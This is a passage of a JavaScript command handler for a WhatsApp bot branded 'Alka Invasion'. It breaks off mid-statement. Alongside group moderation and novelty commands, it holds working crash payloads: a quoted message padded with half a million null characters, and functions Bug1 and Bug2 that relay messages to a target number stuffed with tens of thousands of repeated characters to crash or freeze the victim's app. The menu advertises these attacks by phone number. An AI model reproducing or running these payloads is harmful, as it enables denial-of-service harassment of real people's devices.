module.exports = async (ZoO, m, store) => {
try {
const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
const budy = (typeof m.text == 'string' ? m.text : '')
/*const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : */
const prefix = "."
const isCmd = body.startsWith(prefix)
const from = m.key.remoteJid
const To = ["https://files.catbox.moe/ss4s62.jpg", "https://files.catbox.moe/ss4s62.jpg", "https://files.catbox.moe/ss4s62.jpg", "https://files.catbox.moe/ss4s62.jpg"]
const ytta = To[Math.floor(Math.random() * To.length)]
const Tol = ["https://files.catbox.moe/si7mhl.mp3", "https://files.catbox.moe/h6n3ho.mp3", "https://files.catbox.moe/bungcj.mp3", "https://files.catbox.moe/w32wj2.mp3", "https://files.catbox.moe/hl0bwy.mp3", "https://files.catbox.moe/xbmbcz.mp3", "https://files.catbox.moe/2odfvo.m4a", "https://files.catbox.moe/qyautv.mp3"]
const ytt = Tol[Math.floor(Math.random() * Tol.length)]
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const Premium = JSON.parse(fs.readFileSync('./Databases/database/murbug.json'))
const owner = JSON.parse(fs.readFileSync('./Databases/database/owner.json'))
const pantek = ["https://files.catbox.moe/bungcj.mp3"]
const sound1 = pantek[Math.floor(Math.random() * pantek.length)]
const Toll = ["https://files.catbox.moe/w32wj2.mp3"]
const sound2 = Toll[Math.floor(Math.random() * Toll.length)]
const Tolll = ["https://files.catbox.moe/hl0bwy.mp3"]
const sound3 = Tolll[Math.floor(Math.random() * Tolll.length)]
const Mek = ["https://files.catbox.moe/xbmbcz.mp3"]
const sound4 = Mek[Math.floor(Math.random() * Mek.length)]
const wdh = ["https://files.catbox.moe/2odfvo.m4a"]
const sound5 = wdh[Math.floor(Math.random() * wdh.length)]
const pol = ["https://files.catbox.moe/qyautv.mp3"]
const sound6 = pol[Math.floor(Math.random() * pol.length)]
const cmd = prefix + command
const args = body.trim().split(/ +/).slice(1)
const makeid = crypto.randomBytes(3).toString('hex')
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const qmsg = (quoted.msg || quoted)
const text = q = args.join(" ")
const jsobfus = require('javascript-obfuscator');
const botNumber = await ZoO.decodeJid(ZoO.user.id)
const isOwner = m.sender == owner+"@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
 const kontol = m.key.fromMe ? ZoO.user.id.split(':')[0x0] + '@s.whatsapp.net' || ZoO.user.id : m.key.participant || m.key.remoteJid;
const isGroup = m.chat.endsWith('@g.us')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const senderNumber = m.sender.split('@')[0]
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const groupMetadata = isGroup ? await ZoO.groupMetadata(m.key.remoteJid) : {}
let participant_bot = (isGroup ? groupMetadata.participants.find((v) => v.id == m.botNumber) : {}) || {}
let participant_sender = (isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}) || {}
const isBotAdmin = participant_bot?.admin !== null ? true : false
const isAdmin = participant_sender?.admin !== null ? true : false
const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./Databases/function.js')
const antilink = JSON.parse(fs.readFileSync('./Databases/database/antilink.json'))
const antilink2 = JSON.parse(fs.readFileSync('./Databases/database/antilink2.json'))
const contacts = JSON.parse(fs.readFileSync("./Databases/database/contacts.json"))
const { teksbug1 } = require("./Databases/database/virtex.js")
const { teksbug2 } = require("./Databases/database/delay.js")
const { buttonvirus } = require("./Databases/database/buttonvirus.js")
const { explosion } = require("./Databases/vir/bugcrash.js")
const { Veoni } = require("./Databases/vir/xnaf.js")
const { old1, old2, old3 } = require("./Databases/vir/bugold.js")
const { Cluex } = require("./Databases/database/ClueX.js")

/*FUNCTION OBFUSCATE*/
async function obfus(query) {
return new Promise((resolve, reject) => {
try {
const obfuscationResult = jsobfus.obfuscate(query,
{
compact: false,
controlFlowFlattening: true,
controlFlowFlatteningThreshold: 1,
numbersToExpressions: true,
simplify: true, 
stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `Dantzy`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}


if (isCmd) {
console.log(chalk.yellow.bgCyan.bold(owner), color(`[ PESAN ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
}

const qbug = {key: {remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net'}, message: {listResponseMessage: {title: `CʀʏɴᴢX Fᴏʀᴄᴇ`
}}}

if (isGroup) {
if (antilink.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await ZoO.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await ZoO.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Saya Keluarkan Dari Grup Ini Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://h.top4top.io/p_3220inuij9.png", title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await ZoO.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await ZoO.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}}

if (isGroup) {
if (antilink2.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await ZoO.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await ZoO.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnailUrl: "https://h.top4top.io/p_3220inuij9.png", title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await ZoO.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}}

const qloc = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `Bot Whatsapp Realtime`,jpegThumbnail: ""}}}

const qloc2 = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `𝙓 - 𝙏𝙍𝘼𝙎𝙃𝙀𝙍`,jpegThumbnail: ""}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `120363360916836838@newsletter`,
newsletterName: `𝐀𝐥𝐤𝐚 𝐈𝐧𝐯𝐚𝐬𝐢𝐨𝐧☠️`,
jpegThumbnail: "",
caption: `𝐀𝐥𝐤𝐚 𝐈𝐧𝐯𝐚𝐬𝐢𝐨𝐧☠️`,
inviteExpiration: Date.now() + 1814400000
}
}}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `𝐀𝐥𝐤𝐚 𝐈𝐧𝐯𝐚𝐬𝐢𝐨𝐧☠️`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6287827536016:+6287827536016\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
}

var resize = async (image, width, height) => {
let oyy = await Jimp.read(image)
let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
return kiyomasa
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}


/*QUOTED BUG SENDER*/
const Null = {
key: {
remoteJid: 'p',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
"interactiveResponseMessage": {
"body": {
"text": "Sent",
"format": "DEFAULT"
},
"nativeFlowResponseMessage": {
"name": "galaxy_message",
"paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
"version": 3
}
}
}
}

/*BUG SENDER CRASH HARD*/

async function Bug1(target) {
let virtex = "𝗫-𝐀𝐥𝐤𝐚 𝐈𝐧𝐯𝐚𝐬𝐢𝐨𝐧☠️ 𝐖𝐡𝐚𝐭𝐬𝐚𝐩𝐩";

await ZoO.relayMessage(target, {
groupMentionedMessage: {
message: {
interactiveMessage: {
header: {
locationMessage: {
degreesLatitude: 0,
degreesLongitude: 0
},
hasMediaAttachment: true
},
body: {
text: virtex + "ꦾ".repeat(90000)+"@0".repeat(50000)
},
nativeFlowMessage: {},
contextInfo: {
 mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
 groupMention: [{ groupJid: "0@s.whatsapp.net", groupSubject: "Skyzo" }]
}
}
}
}
}, { participant: { jid: target, quoted: Null } }, { messageId: null });
}

async function Bug2(target) {
try {
var atc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
"productMessage": {
"product": {
"productImage": {
"url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m237/up-oil-image-6a66c589-1ed7-4831-9ff7-a537aeec42e5?ccb=9-4&oh=01_Q5AaIO-QEENiH3ITkuP8eDd60OuxvNiUaeZsPjnEfSNbf_lx&oe=6761488D&_nc_sid=e6ed6c&mms3=true",
"mimetype": "image/jpeg",
"fileSha256": "4euJQxdTEpk2NS0R7QK6MjGhcix+h1Evxcrrmj1u9nM=",
"fileLength": "9900090",
"height": 735,
"width": 735,
"mediaKey": "e/5eEYHPLtzZAXLn9cBR8M3+w0bvdFsBvoSf9EPy75w=",
"fileEncSha256": "/UO6fl07VoTDsXv1W9zqYAS+pBUz6HVokpl4r84LuOg=",
"directPath": "/o1/v/t62.7118-24/f1/m237/up-oil-image-6a66c589-1ed7-4831-9ff7-a537aeec42e5?ccb=9-4&oh=01_Q5AaIO-QEENiH3ITkuP8eDd60OuxvNiUaeZsPjnEfSNbf_lx&oe=6761488D&_nc_sid=e6ed6c",
"mediaKeyTimestamp": "1731847042",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEIAQwMBIgACEQEDEQH/xAAuAAACAwEBAAAAAAAAAAAAAAAABQIDBAYBAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAIRZQzqneSimyUheTzUwLiVG35hjcuoVQl3UxzluBhzlPDmixpBgwhI/SYDq16bSbqWvi8cSLnQ6S0nXcpR6vnU8xYjpLRMiTDVnA9zgWSArAoAP/8QAKBAAAgICAQMEAgIDAAAAAAAAAQIAAwQRIRITMQUQIkEycVFhFDOC/9oACAEBAAE/ADUVZCfszKQJlLMfEN1netgVajY7foR0ZuFJ2pBhSp1IYfsR6Atb1HwOQZVZ1Ig1swYqP8mPMd1D/JfBj09/KVmGlCy4uCAvgCPqxV3/AESISEvH8MJZWGeKLGNiNyVmHcS/aZOQZ/w0zcjqv2p2BMQmxA7ER2VbOYVb/I2D8SstQMv9jxAXLBG8geRP9JZ2PkTEYJfa7EfzF9VrmyTuYWYKyEbxMn8VK66m55iWMSCy/ICO9mlIHiO94YOAJe69oIfyaXBqXKBtn79kwnso7qGJi7AcMImR1N2rn/RlKV9tSpBiHq6t+NzLupqO0O3mGnW/ctbbGZ+GoJZPuFG3MK0PT2g2juDDpVuqepUIoBRJVkXUaZH4j519nltCYVLWt1dHVqCis6PRphMlqRUxtjuCza8bgJU9Q4mL6khXpuOmhei9CvWpBmQnasZN8AwCYlmPRjL8xLvWEHFaS6625iWY+zgbbXiEbnU48EiFt+YvPE5EbmIeRuMNkyvmtov5xwNt7LG8T6g9v//EABkRAAIDAQAAAAAAAAAAAAAAABEwAAEQIP/aAAgBAgEBPwBI0cCWj//EABkRAAIDAQAAAAAAAAAAAAAAAAARARAgMP/aAAgBAwEBPwDLuRip4ZHD/9k="
},
"productId": "28364464939807272",
"title": "𝗫- 𝐀𝐥𝐤𝐚 𝐈𝐧𝐯𝐚𝐬𝐢𝐨𝐧☠️ 𝐗⃰͜•" + "ꦾ".repeat(90000),
"description": "𝗫- 𝐀𝐥𝐤𝐚 𝐈𝐧𝐯𝐚𝐬𝐢𝐨𝐧☠️ 𝐗⃰͜" + "ꦾ".repeat(90000),
"currencyCode": "𝗫- 𝐀𝐥𝐤𝐚 𝐈𝐧𝐯𝐚𝐬𝐢𝐨𝐧☠️ 𝐗⃰͜" + "ꦾ".repeat(90000),
"priceAmount1000": "999999999999999",
"productImageCount": 1
},
"businessOwnerJid": "0@s.whatsapp.net",
"contextInfo": {}
}
 }
}
}), { 
userJid: target, 
quoted: Null
});
await ZoO.relayMessage(target, atc.message, { participant: { jid: target }, messageId: atc.key.id });

} catch (error) {
console.error("Failed to send message:", error);
}
console.log(chalk.red.bold(`Crash System To ${target}`));
}

const reply = bokep => {
      ZoO.sendMessage(m.chat, {
        'text': bokep,
        'contextInfo': {
          'mentionedJid': [kontol],
          'forwardingScore': 0x98967f,
          'isForwarded': true,
          'externalAdReply': {
            'showAdAttribution': true,
            'containsAutoReply': true,
            'title': "⌁⃰𝐀𝐥𝐤𝐚 𝐈𝐧𝐯𝐚𝐬𝐢𝐨𝐧☠️༑",
            'body': `${global.own}`,
            'previewType': "PHOTO",
            'thumbnailUrl': 'https://files.catbox.moe/ss4s62.jpg',
            'sourceUrl': ''
          }
        }
      }, {
        'quoted': qkontak
      });
    };

switch (command) {

case "menu": case "xmenu": {
const menu = `
\`𝐈 𝐍 𝐅 𝐎 𝐁 𝐎 𝐓\`

𝐁𝐎𝐓 𝐍𝐀𝐌𝐄 : ${global.bot}
𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : ${global.own}
𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : ${global.ver}
𝐒𝐓𝐀𝐓𝐔𝐒 : ${runtime(process.uptime())}

\`𝗠𝗘𝗡𝗨 𝗢𝗪𝗡𝗘𝗥 𝗔𝗟𝗞𝗔\`
 ${global.log} > タaddmurbug <tag/62x>
 ${global.log} > タdelmurbug <tag/62x>
 ${global.log} > タaddown <tag/62x>
 ${global.log} > タdelown <tag/62x>
 ${global.log} > タhidetag <text>
 ${global.log} > タself
 ${global.log} > タpublic
 
\`𝗠𝗘𝗡𝗨 𝗚𝗔𝗕𝗨𝗧\`
 ${global.log} > タcek-khodam <nama>
 ${global.log} > タcek-ganteng <nama>
 ${global.log} > タcek-cantik <nama>
 ${global.log} > タhentai
 
\`𝗠𝗨𝗥𝗕𝗨𝗚 𝗠𝗘𝗡𝗨\`
 ${global.log} > タhard-core <number>
 ${global.log} > タalka-crash <number>
 ${global.log} > タui-blank <number>
 ${global.log} > タalka-blank <number>
 ${global.log} > タinvasi-core <number>
 ${global.log} > タeasy-bug <number>

\`𝗧𝗬𝗣𝗘 𝗕𝗨𝗚 𝗞𝗛𝗨𝗦𝗨𝗦 𝗢𝗪𝗡𝗘𝗥\`
 ${global.log} > タown-ui <number>
 ${global.log} > タscreen-blank <number>
 ${global.log} > タown-alka <number>
 ${global.log} > タalka-ui <number>
 ${global.log} > タstreet-bug <number>
 
\`𝗠𝗘𝗡𝗨 𝗕𝗨𝗚 𝗘𝗠𝗢𝗝𝗜\`
 ${global.log} > タ💋 <number>
 ${global.log} > タ🚬 <number>
 ${global.log} > タ🥶 <number>
 ${global.log} > タ🔥 <number>
 ${global.log} > タ😎 <number>

\`𝗢𝗧𝗛𝗘𝗥 𝗠𝗘𝗡𝗨\`
 ${global.log} > タremini <picture>
 
\`𝗠𝗘𝗡𝗨 𝗟𝗔𝗚𝗨\`
 ${global.log} > タsound1
 ${global.log} > タsound2
 ${global.log} > タsound3 - sound6

 𝐀𝐋𝐊𝐀 𝐂𝐎𝐌𝐔𝐍𝐈𝐓𝐘
 • 𝐁𝐎𝐓 𝐍𝐀𝐌𝐄 : 𝐀𝐥𝐤𝐚𝐄𝐱𝐞𝐜𝐮𝐭𝐢𝐨𝐧
 • 𝐂𝐑𝐄𝐀𝐓𝐎𝐑 : 𝐀𝐋𝐊𝐀
`
await ZoO.sendMessage(from, { 
image: { url: `${ytta}` },
caption: menu,
 mentions:[sender] 
 }, {
  quoted: qkontak
  });
await ZoO.sendMessage(m.chat, {audio: {url: `${ytt}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break

case 'hentai': {
reply(`*\`TOBAT BRO PIKIRIN MASA DEPAN KOCAK MASA MAU NONTON HENTAI\`*`)
await ZoO.sendMessage(m.chat, {audio: {url: `${ytt}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break

case "cek-khodam": {
if (!isPremium) return reply("*KHUSUS PREMIUM!!*")
if (!args[0]) return reply('NAMA LU MANA ANJG')
const khodam = [
"Ikan", "Sendal", "Genderuwo", "Ijat", "Fizi", "kaleng kejepit", "Raja Ibelis", "Singa", "Lele", "Ayam Kaepci","kucing mewing","tutup panci","ular sigma","kucing isriwil","kapal karam","anggrek mekar Pontianak","bagong leweng","lonte arab"," kosong","pertamina kebalik","ambatukam","kodok terbang","laba laba sunda","ambatron","laba laba salto","macan putih"]
const hasil = khodam[Math.floor(Math.random() * khodam.length)]
const teks = `
\`HASIL CEK KHODAM\`
\`NAMA\` : *${args[0]}*
\`KHODAM\` : *${hasil}*
`
reply(teks)
}
break

case "cek-ganteng": {
if (!isPremium) return reply("*KHUSUS PREMIUM!!*")
if (!args[0]) return reply('NAMA LU MANA??')
const ganteng = [
"10", "20", "0", "30", "40", "50", "60", "70","80","90","100"]
const hasil = ganteng[Math.floor(Math.random() * ganteng.length)]
const teks = `
\`HASIL CEK GANTENG\`
\`NAMA\` : *${args[0]}*
\`PERSENTASE\` : *${hasil}℅*
`
reply(teks)
}
break
case "sound1": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
await ZoO.sendMessage(m.chat, {audio: {url: `${sound1}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound2": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
await ZoO.sendMessage(m.chat, {audio: {url: `${sound2}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound3": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
await ZoO.sendMessage(m.chat, {audio: {url: `${sound3}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound4": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
await ZoO.sendMessage(m.chat, {audio: {url: `${sound4}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound5": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
await ZoO.sendMessage(m.chat, {audio: {url: `${sound5}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case "sound6": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
await ZoO.sendMessage(m.chat, {audio: {url: `${sound6}`}, mimetype:'audio/mp4', ptt: true}, {quoted: m })
}
break
case 'remini': {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
if (!/image/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
await ZoO.sendMessage(m.chat, { react: { text: "🔎",key: m.key,}})
const { remini } = require('./Databases/remini')
let media = await quoted.download()
let proses = await remini(media, "enhance");
ZoO.sendMessage(m.chat, { image: proses, caption: 'Sukses'}, { quoted: m})
}
break
case "cek-cantik": {
if (!isPremium) return reply("*KHUSUS PREMIUM!!*")
if (!args[0]) return reply('NAMA LU MANA??')
const ganteng = [
"10", "20", "0", "30", "40", "50", "60", "70","80","90","100"]
const hasil = ganteng[Math.floor(Math.random() * ganteng.length)]
const teks = `
\`HASIL CEK GANTENG\`
\`NAMA\` : *${args[0]}*
\`PERSENTASE\` : *${hasil}℅*
`
reply(teks)
}
break

case "public": {
if (!isCreator) return reply(msg.owner)
ZoO.public = true
reply("*MODE WAR TELAH AKTIF*")
}
break
case "self": {
if (!isCreator) return reply(msg.owner)
ZoO.public = false
reply("*MODE SELEB TELAH AKTIF*")
}
break
case "qc": {
if (!isOwner && !isPremium) return reply("LU SIAPA KOCAK")
if (!text) return reply('teksnya')
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
let ppuser
try {
ppuser = await ZoO.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://files.catbox.moe/ss4s62.jpg'
}
let reswarna = await warna[Math.floor(Math.random()*warna.length)]
m.reply(msg.wait)
const obj = {
      "type": "quote",
      "format": "
